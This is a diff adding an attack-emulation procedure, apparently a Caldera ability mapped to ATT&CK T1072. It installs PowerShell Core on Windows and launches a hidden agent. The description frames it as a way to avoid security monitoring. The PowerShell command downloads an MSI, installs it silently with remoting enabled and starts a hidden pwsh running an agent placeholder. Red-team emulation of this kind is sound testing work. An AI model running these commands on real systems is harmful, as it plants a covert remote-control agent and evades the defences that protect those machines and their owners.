@@ -1,0 +1,25 @@
+id: 60f63260-39bb-4136-87a0-b6c2dca799fc
+metadata:
+  version: 1
+  authors:
+    - privateducky
+  tags: []
+name: Install PowerShell Core 6
+description: |
+  PowerShell is installed by default on Windows computers. It is often abused by hackers, so it is usually heavily
+  monitored by security products. There is a separate open-source project called PowerShell Core which is not monitored.
+  This procedure downloads, installs and restarts a PowerShell agent under PowerShell Core.
+tactic: execution
+technique:
+  id: T1072
+  name: Third-party Software
+platforms:
+  windows:
+    psh:
+      command: |
+        $wc=New-Object System.Net.WebClient;
+        $output="PowerShellCore.msi";
+        $wc.DownloadFile("https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi", $output);
+        Start-Process msiexec.exe -ArgumentList "/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1" -Wait;
+        $env:Path += ";C:\Program Files\Powershell\6";
+        Start-Process pwsh -ArgumentList "-c #{agent}" -WindowStyle hidden;
